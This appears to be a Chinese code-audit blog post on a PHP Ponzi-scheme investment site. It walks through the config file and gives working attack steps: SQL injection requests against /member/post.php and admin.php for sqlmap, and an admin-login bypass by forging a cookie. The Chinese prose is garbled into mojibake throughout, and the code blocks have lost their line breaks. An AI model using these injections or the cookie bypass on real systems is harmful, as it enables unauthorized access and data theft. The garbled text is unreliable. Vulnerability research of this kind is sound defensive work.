#  ä»£ç å®¡è®¡æŸèµ„é‡‘ç›˜ç†è´¢ç³»ç»Ÿ  
 å®æˆ˜å®‰å…¨ç ”ç©¶   2025-06-15 02:00  
  
```
å…è´£å£°æ˜ï¼šæœ¬å…¬ä¼—å·æ‰€æä¾›çš„æ–‡å­—å’Œä¿¡æ¯ä»…ä¾›å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œä¸å¾—ç”¨äºä»»ä½•éæ³•ç”¨é€”ã€‚
æˆ‘ä»¬å¼ºçƒˆè°´è´£ä»»ä½•éæ³•æ´»åŠ¨ï¼Œå¹¶ä¸¥æ ¼éµå®ˆæ³•å¾‹æ³•è§„ã€‚
è¯»è€…åº”è¯¥è‡ªè§‰éµå®ˆæ³•å¾‹æ³•è§„ï¼Œä¸å¾—åˆ©ç”¨æœ¬å…¬ä¼—å·æ‰€æä¾›çš„ä¿¡æ¯ä»äº‹ä»»ä½•è¿æ³•æ´»åŠ¨ã€‚
æœ¬å…¬ä¼—å·ä¸å¯¹è¯»è€…çš„ä»»ä½•è¿æ³•è¡Œä¸ºæ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚
```  
### 1.ä»‹ç»  
  
è¿™å¥—ç³»ç»Ÿå±äºèµ„é‡‘ç›˜ï¼Œ  
èµ„é‡‘ç›˜ï¼Œé¡¾åæ€ä¹‰ï¼Œæ˜¯å°†ä¸åŠ¨çš„èµ„é‡‘å˜ä¸ºæµåŠ¨çš„èµ„é‡‘ï¼Œå°†ä¸ªäººæ‰‹ä¸­é—²æ•£çš„èµ„é‡‘åˆ©ç”¨èµ·æ¥ï¼Œç”¨äºä¿å€¼ã€å¢å€¼ã€‚ ä½†éšç€èèµ„å½¢å¼çš„å‘å±•ï¼Œç»è¿‡ä¸€éƒ¨åˆ†äººçš„åŠ å·¥å’Œä¿®é¥°ï¼Œå°±å¼‚åŒ–ä¸ºè¿™æ ·ä¸€ç§ç°è±¡ï¼šå®ƒå‘ç¤¾ä¼šä¸ç‰¹å®šçš„å¯¹è±¡å¸æ”¶èµ„é‡‘ï¼Œæ ¹æ®è¡Œä¸šå†…æ¸¸æˆè§„åˆ™ï¼Œæ‰¿è¯ºé«˜é¢è¿”åˆ©ã€‚ è¡¨é¢çœ‹ä¸Šå»æ˜¯èµ„æœ¬è¿ä½œï¼Œå®è´¨å´æ˜¯åºæ°éª—å±€ã€‚  
### 2.æ­å»º  
  
ç¯å¢ƒ php5.6 mysql8 ä¸­é—´ä»¶ apache  
  
ä½¿ç”¨phpstudyæ­å»º åˆ›å»ºç½‘ç«™å ä½¿ç”¨navformysqlå°†æ•°æ®åº“mf.sqlå¯¼å…¥åˆ°æŒ‡å®šçš„æ•°æ®åº“Â   
  
ä¿®æ”¹ Â include/dbConfig.php  
Â  æ•°æ®åº“ä¿¡æ¯  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcds2h7MEsLeRXXuFejqTYqG4ibjKPu4B2KgaC26dn80AUk2BYa5OeFfcg/640?wx_fmt=jpeg&from=appmsg "")  
  
ç›´æ¥è®¿é—®å³å¯ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcdWQxEd06BD5s9SXbEiaDEdicsfMgGKzzkv0xcMjBNRmsofgUdPOKoVq5g/640?wx_fmt=jpeg&from=appmsg "")  
### 4.æ ¸å¿ƒæ–‡ä»¶åˆ†æ  
  
æ–‡ä»¶ include/conn.php Â è¿™ä¸ªæ˜¯ç½‘ç«™çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶Â   
```
<?php# æ–‡ä»¶åç§°:conn.php 2009-11-1 16:03:03# ç½‘ç«™ç›¸å…³çš„è®¾ç½®åŠé…ç½®ä¿¡æ¯header("Content-type: text/html;charset=utf-8");error_reporting(E_ERROR | E_PARSE);	//å¼€å‘æ—¶æ³¨é‡Šæ‰ï¼Œæ­£å¼è¿è¥æ—¶ï¼Œå¼€å¯//@ini_set("display_errors", "Off");@set_time_limit(0);//ç‰ˆæœ¬ç›¸å…³è®¾ç½®ï¼Œé˜²ä¸åŒç‰ˆæœ¬è€Œå‡ºé”™PHP_VERSION >= '5.1' && date_default_timezone_set('Asia/Shanghai');session_cache_limiter('private, must-revalidate');Â @ini_set('session.auto_start',0);Â if(PHP_VERSION < '4.1.0') {	$_GET Â  Â  Â  Â  = &$HTTP_GET_VARS;	$_POST Â  Â  Â  Â = &$HTTP_POST_VARS;	$_COOKIE Â  Â  Â = &$HTTP_COOKIE_VARS;	$_SERVER Â  Â  Â = &$HTTP_SERVER_VARS;	$_ENV Â  Â  Â  Â  = &$HTTP_ENV_VARS;	$_FILES Â  Â  Â  = &$HTTP_POST_FILES;}//ç³»ç»Ÿé€šç”¨å‡½æ•°åº“ åŠ é˜²æ³¨å…¥ç­‰éæ³•æ“ä½œ//MAGIC_QUOTES_GPC = off = 0ï¼Œéœ€è¦æ‰‹å·¥è½¬ä¹‰define('ROOTPATH', substr(dirname(__FILE__), 0, -7));define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc()); Â //isset($_REQUEST['GLOBALS']) && exit('Access Error');require_once 'function.php';foreach(array('_COOKIE', '_POST', '_GET') as $_request) {	foreach($$_request as $_key => $_value) {		$_key{0} != '_' && $$_key = daddslashes($_value);	}}(!MAGIC_QUOTES_GPC) && $_FILES = daddslashes($_FILES);$REQUEST_URI Â = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];//é¡µé¢å‹ç¼©function_exists('ob_gzhandler') ? ob_start('ob_gzhandler') :ob_start();//ç”¨æˆ·IPif($_SERVER['HTTP_X_FORWARDED_FOR']){	$m_user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];} elseif($_SERVER['HTTP_CLIENT_IP']){	$m_user_ip = $_SERVER['HTTP_CLIENT_IP'];} else{	$m_user_ip = $_SERVER['REMOTE_ADDR'];}$m_user_ip Â = preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/',$m_user_ip) ? $m_user_ip : 'Unknown';//å»ºç«‹æ•°æ®åº“è¿æ¥$db_settings = parse_ini_file('dbConfig.php');@extract($db_settings);require_once 'mysql.php';$db = new dbmysql();$db->dbconn($con_db_host,$con_db_id,$con_db_pass,$con_db_name);$ckeditor_mc_id = '';$ckeditor_mc_val = '';$ckeditor_mc_lang = "zh-cn";$ckeditor_mc_toolbar = "Default";$ckeditor_mc_height = "400";//æ“ä½œå¯†ç define('CC_ACT_PWD', '123asd..');
```  
  
è¿™é‡Œçš„ä»£ç æ˜¯é‡ç‚¹ Â get_magic_quotes_gpc() åœ¨php5.6 é»˜è®¤æ˜¯0Â   
```
define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc()); //è¿™ä¸ªå€¼æ˜¯0Â foreach(array('_COOKIE', '_POST', '_GET') as $_request) { //å¯¹ä¼ å…¥çš„cookieã€post ã€getå‚æ•° å­˜åœ¨ç‰¹æ®Šå­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ ä¾‹å¦‚' å˜æˆ'\	foreach($$_request as $_key => $_value) {		$_key{0} != '_' && $$_key = daddslashes($_value);	}}(!MAGIC_QUOTES_GPC) && $_FILES = daddslashes($_FILES); //æ–‡ä»¶ä¸Šä¼  åç¼€åä¹Ÿä¼šè¢«è¿‡æ»¤
```  
  
åœ¨ç™»å½•çš„æ—¶å€™ä¼ å…¥ç”¨æˆ·å’Œå¯†ç  Â å‘ç°å•å¼•å·è¢«è¿‡æ»¤  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcdeqW5dsyMo2SdlpoVOuoEkOjjUqL0uNAXcVib5I31LlA5I0iaqNk7R7wg/640?wx_fmt=jpeg&from=appmsg "")  
### 5.å‰å°SQLæ³¨å…¥æ¼æ´  
  
æ¼æ´æ–‡ä»¶ä½ç½®Â /member/post.php  
$ddhå‚æ•°ä½¿ç”¨$_GETè·å– å¹¶ä¸ä¼šè¢«è¿‡æ»¤ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcdHyc4RjQHrq0icUSTwMvwh9nXPIc6Ykmwkt37VtuzAHuYNXianRsHBRoA/640?wx_fmt=jpeg&from=appmsg "")  
  
ä¾‹å­  
```
<?phpinclude 'include/conn.php';echo $username;echo "<hr>";echo $_GET['username'];
```  
  
å¦‚å›¾  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcd5z7tDwBEbfagWkL5Mu9DJye9jJH9p7T3mkoPfMNPEUyq5awRej03Ow/640?wx_fmt=jpeg&from=appmsg "")  
  
ä½¿ç”¨sqlmapè¿›è¡Œæµ‹è¯•  
```
GET /member/post.php?ddh=1'&money=2&key=2052cd88bea3f9016a0057436dbbd750 HTTP/1.1Host: www.licai1.comAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://www.licai1.com/member/index.phpAccept-Encoding: gzip, deflateCookie: m_username=15888888888; m_password=e99a18c428cb38d5f260853678922e03; m_level=4; m_isPass=1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
```  
  
æ³¨å…¥æˆåŠŸ  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcdia3q9QwwiawW9iaCeuPvBibnwqbycUawfk6DV7Og5dkZ9cGEWz4LuBoUug/640?wx_fmt=jpeg&from=appmsg "")  
### 6.åå°SQLæ³¨å…¥æ¼æ´  
  
æ¼æ´æ–‡ä»¶ä½ç½®Â D:\phpstudy_pro\WWW\www.licai1.com\admin\admin.php  
  
idå¹¶æ²¡æœ‰ä½¿ç”¨å•å¼•å· å­˜åœ¨SQLæ³¨å…¥  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcdntTJh1jtjBGzibBhwEvs4OAtUwYbDxT0OicLjgIBWP2WlkUjSSxBhciag/640?wx_fmt=jpeg&from=appmsg "")  
  
ç™»å½•åå°æŠ“åŒ… ä½¿ç”¨sqlmap.py -r sql4.txt è¿›è¡Œæµ‹è¯•  
```
GET /admin/admin.php?clause=editinfo&id=5 HTTP/1.1Host: www.licai1.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=964l42aof1mlb17jum3k2501m0; h_userName=admin; h_passWord=21232f297a57a5a743894a0e4a801fc3Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Accept-Encoding: gzip, deflate
```  
  
æ³¨å…¥æˆåŠŸ  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcdFcvDbgNvw2acRAhwOYBrfDaHUF4g2WUYAHqibgZuHqspDys6arrQIMg/640?wx_fmt=jpeg&from=appmsg "")  
### 7.åå°éªŒè¯ç»•è¿‡  
  
æ¼æ´æ–‡ä»¶ä½ç½®Â admin/chkLogged.php  
  
ä»cookieè·å–è´¦å·å’Œå¯†ç  åˆ¤æ–­ ä¸ä¸ºç©ºä¹‹å ä¼ å…¥å­˜åœ¨çš„è´¦å·è¿›è¡ŒæŸ¥è¯¢ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcdqV83U7jP5EteN90ZsDo37cmQEoWJRc32GUmHGGmonNaWmnOd5JWGicg/640?wx_fmt=jpeg&from=appmsg "")  
  
è®¿é—®åå°å¡«å†™cookieå³å¯ç»•è¿‡  
```
Cookie: h_userName=admin; h_passWord=1111
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcdHOjuRneGXqCUo6RQia8YxVnL7RzzTBMxiaMiaYJZalVxX6Um0seILyd3A/640?wx_fmt=jpeg&from=appmsg "")  
  
  
8.åŸ¹è®­å­¦ä¹   
  
  
ğŸš€ å¦‚æœä½ æƒ³ç³»ç»ŸæŒæ¡ç½‘ç»œå®‰å…¨å®æˆ˜æŠ€èƒ½ï¼Œä»å…¥é—¨åˆ°è¿›é˜¶å®Œæˆä¸€æ¬¡èƒ½åŠ›è·ƒè¿ï¼Œæˆ‘ä»¬æä¾›äº†é«˜è´¨é‡çš„åŸ¹è®­è¯¾ç¨‹ï¼Œå†…å®¹æ¶µç›– Web å®‰å…¨ã€å†…ç½‘æ¸—é€ã€çº¢é˜Ÿå¯¹æŠ—ã€ä»£ç å®¡è®¡ç­‰æ–¹å‘ã€‚  
  
ğŸ“š è¯¾ç¨‹ç”±å®æˆ˜ç»éªŒä¸°å¯Œçš„è®²å¸ˆæ•™å­¦ï¼Œé€‚åˆé›¶åŸºç¡€æˆ–æœ‰ä¸€å®šåŸºç¡€çš„å­¦å‘˜ã€‚  
  
ğŸ“© æœ‰å…´è¶£äº†è§£è¯¾ç¨‹è¯¦æƒ…ï¼Œæ‰«ä¸€æ‰« æ·»åŠ æœˆå¸ˆå‚…å¾®ä¿¡  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ABAibBfLFiaWJj3GaxBQsRTcdfbicjic0toZ3E77AjB04TbQauCN7OnHwDAW44jPo17jcUIegZicYhqCXQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
